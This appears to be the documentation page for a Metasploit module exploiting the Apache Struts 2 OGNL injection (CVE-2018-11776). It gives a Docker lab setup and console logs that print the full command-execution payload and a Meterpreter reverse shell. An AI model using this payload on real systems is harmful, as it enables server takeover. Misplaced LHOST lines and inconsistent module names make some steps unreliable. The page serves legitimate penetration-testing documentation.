{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/struts2_namespace_ognl","result":{"data":{"moduleMetadataJson":{"id":"3ffe8155-e818-5b25-9377-97ea30656883","name":"Apache Struts 2 Namespace Redirect OGNL Injection","fullname":"exploit/multi/http/struts2_namespace_ognl","description":"This module exploits a remote code execution vulnerability in Apache Struts\n        version 2.3 - 2.3.4, and 2.5 - 2.5.16. Remote Code Execution can be performed\n        via an endpoint that makes use of a redirect action.\n\n        Note that this exploit is dependant on the version of Tomcat running on\n        the target.  Versions of Tomcat starting with 7.0.88 currently don't\n        support payloads larger than ~7.5kb.  Windows Meterpreter sessions on\n        Tomcat >=7.0.88 are currently not supported.\n\n        Native payloads will be converted to executables and dropped in the\n        server's temp dir. If this fails, try a cmd/* payload, which won't\n        have to write to the disk.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/struts2_namespace_ognl","documentationSlug":"/modules/documentation/exploit/multi/http/struts2_namespace_ognl"},"documentation":{"html":"<p>CVE-2018-11776 is a critical vulnerability in the way Apache Struts2 handles namespaces and redirection, which permits an attacker to execute [OGNL(<a href=\"https://commons.apache.org/proper/commons-ognl/language-guide.html\">https://commons.apache.org/proper/commons-ognl/language-guide.html</a>) remotely.  Using OGNL, the attacker can modify files and execute commands.</p>\n<p>The vulnerability was reported to Apache by [Man Yue Mo] from Semmle in April 2018.  It was widely publicized in August 2018, with PoCs appearing shortly thereafter.</p>\n<p>Tomcat versions prior to 7.0.88 will provide output from the injected OGNL and require that we prepend some OGNL to set <code class=\"language-text\">allowStaticMethodAccess=true</code>. Versions starting at 7.0.88 do not provide OUTPUT from injected OGNL and will error if we attempt to modify <code class=\"language-text\">allowStaticMethodAccess</code>.  The <code class=\"language-text\">ENABLE_STATIC</code> option is used to toggle behavior, and the <code class=\"language-text\">check</code> method fingerprints the correct version.</p>\n<p>As a result of the lack of OGNL output, we currently cannot support large payloads (namely Windows Meterpreter payloads) on Tomcat versions >= 7.088. Future committers might consider compressing the windows/x64/meterpreter templates or implementing GZIP compression of payloads.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  The Struts showcase app, with a slight adaptation to introduce the vulnerability, works reliabliy as a practice environment.\n<em>@hook-s3c</em> did an amazing job with <a href=\"https://github.com/hook-s3c/CVE-2018-11776-Python-PoC/blob/master/README.md\">their writeup</a>, which I'll include exerpts of here:</p>\n<ol>\n<li>\n<p>From a stock Ubuntu VM, install docker:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo apt update &amp;&amp; sudo apt install docker.io</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>\n<p>Download a vulnerable Struts showcase application inside a docker container:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo docker pull piesecurity/apache-struts2-cve-2017-5638\nsudo docker run -d --name struts2 -p 32771:8080 piesecurity/apache-struts2-cve-2017-5638\nCONTAINER_ID=`sudo docker ps -l -q`</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>\n<p>Now that the container is running, open a terminal inside of it:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo docker exec -it $CONTAINER_ID /bin/bash</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>\n<p>From within the container, install your text editor of choice and modify the Struts configs:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo apt update &amp;&amp; sudo apt install nano\nnano /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/struts.xml</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>\n<p>Update the struts config to add this to above line #11:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;constant name=&quot;struts.mapper.alwaysSelectFullNamespace&quot; value=&quot;true&quot; /&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>\n<p>Update the same struts config file to add this above line #78:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  &lt;action name=&quot;help&quot;&gt;\n      &lt;result type=&quot;redirectAction&quot;&gt;\n          &lt;param name=&quot;actionName&quot;&gt;date.action&lt;/param&gt;\n      &lt;/result&gt;\n  &lt;/action&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>\n<p>Still within the container, shutdown the environment:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">/usr/local/tomcat/bin/shutdown.sh</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>\n<p>Upon completion, the container will shutdown and you'll return to the host environment.  Restart the container, now with a vulnerable endpoint:\nmsf5 exploit(multi/http/struts2<em>namespace</em>ognl) > set LHOST 192.168.199.134</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo docker start $CONTAINER_ID</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n</ol>\n<p>  Congratulations.  You now have a vulnerable Struts server.  If you're following these instructions, your server should be listening on 0.0.0.0:32771.  To confirm:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">INTERFACE=`ip route list 0.0.0.0/0 | cut -d&#39; &#39; -f5`\nIPADDRESS=`ip addr show $INTERFACE | grep -Po &#39;inet \\K[\\d.]+&#39;`\nPORT_NUM=`sudo docker port $CONTAINER_ID | sed &#39;s/.*://&#39;`\necho &quot;Struts container is listening on $IPADDRESS:$PORT_NUM&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>  Confirm that check functionality works:</p>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Install the application using the steps above.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Start msfconsole.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Load the module: <code class=\"language-text\">use exploit/multi/http/struts_namespace_ognl</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set the RHOST.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set an invalid ACTION: <code class=\"language-text\">set ACTION wrong.action</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Confirm the target is <em>not</em> vulnerable: <code class=\"language-text\">check</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Observe that the target is <em>not</em> vulnerable: <code class=\"language-text\">The target is not exploitable.</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set a valid ACTION: <code class=\"language-text\">set ACTION help.action</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Confirm that the target is vulnerable: <code class=\"language-text\">The target is vulnerable.</code></li>\n</ul>\n<p>  Confirm that command execution functionality works:</p>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set a payload: <code class=\"language-text\">set PAYLOAD cmd/unix/generic</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set a command to be run: <code class=\"language-text\">set CMD hostname</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Run the exploit: <code class=\"language-text\">run</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Confirm the output is the container ID of your docker environment, e.g: <code class=\"language-text\">b3d9b350d9b6</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> You will not be given a shell (yet).</li>\n</ul>\n<p>  Confirm that payload upload and execution works:</p>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set a payload, e.g.: <code class=\"language-text\">set PAYLOAD linux/x64/meterpreter/reverse_tcp</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Configure <code class=\"language-text\">LHOST</code> and <code class=\"language-text\">RHOST</code> as necessary.</li>\n<li class=\"task-list-item\">\n<p><input type=\"checkbox\" disabled> Run the exploit: <code class=\"language-text\">run</code>\nmsf5 exploit(multi/http/struts2<em>namespace</em>ognl) > set LHOST 192.168.199.134</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n</li>\n</ul>\n<p>  <strong>TARGETURI</strong></p>\n<p>  The path to the struts application.  Note that this does not include the endpoint.  In the environment above, the path is <code class=\"language-text\">/</code>.</p>\n<p>  <strong>ACTION</strong></p>\n<p>  The endpoint name.  In the environment above, the endpoint is <code class=\"language-text\">help.action</code>.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"version-of-software-and-os-as-applicable\" style=\"position:relative;\"><a href=\"#version-of-software-and-os-as-applicable\" aria-label=\"version of software and os as applicable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Version of software and OS as applicable</h3>\n<p>  Checking a vulnerable endpoint, as installed in the above steps:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/struts_namespace_ognl\nmsf5 exploit(multi/http/struts_namespace_ognl) &gt; set RHOSTS 192.168.199.135\nmsf5 exploit(multi/http/struts_namespace_ognl) &gt; set RPORT 32771\nmsf5 exploit(multi/http/struts_namespace_ognl) &gt; set ACTION help.action\nACTION =&gt; help.action\nmsf5 exploit(multi/http/struts_namespace_ognl) &gt; check\n[+] 192.168.199.135:32771 The target is vulnerable.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Running an arbitrary command on the above-described environment:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/http/struts_namespace_ognl) &gt; set VERBOSE true\nmsf5 exploit(multi/http/struts_namespace_ognl) &gt; set PAYLOAD cmd/unix/generic\nPAYLOAD =&gt; cmd/unix/generic\nmsf5 exploit(multi/http/struts_namespace_ognl) &gt; set CMD hostname\nCMD =&gt; hostname\nmsf5 exploit(multi/http/struts_namespace_ognl) &gt; run\n[*] Submitted OGNL: (#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true).(#cmd=&#39;hostname&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())\n\n[*] Command ran.  Output from command:\nb3d9b350d9b6\n\n[*] Exploit completed, but no session was created.\nmsf5 exploit(multi/http/struts_namespace_ognl) &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Getting a Meterpreter session on the above-described environment:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/http/struts2_namespace_ognl\nmsf5 exploit(multi/http/struts2_namespace_ognl) &gt; set ACTION help.action\nmsf5 exploit(multi/http/struts2_namespace_ognl) &gt; set RHOSTS 192.168.199.135\nmsf5 exploit(multi/http/struts2_namespace_ognl) &gt; set RPORT 32771\nmsf5 exploit(multi/http/struts2_namespace_ognl) &gt; set PAYLOAD linux/x64/meterpreter/reverse_tcp\nmsf5 exploit(multi/http/struts2_namespace_ognl) &gt; set LHOST 192.168.199.134\nmsf5 exploit(multi/http/struts2_namespace_ognl) &gt; run\n\n[*] Started reverse TCP handler on 192.168.199.134:4444 \n[+] Target profiled successfully: Linux 4.4.0-112-generic amd64, running as root\n[+] Payload successfully dropped and executed.\n[*] Sending stage (816260 bytes) to 192.168.199.135\n[*] Meterpreter session 1 opened (192.168.199.134:4444 -&gt; 192.168.199.135:47482) at 2018-08-31 13:15:22 -0500\n\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"3ffe8155-e818-5b25-9377-97ea30656883"}}}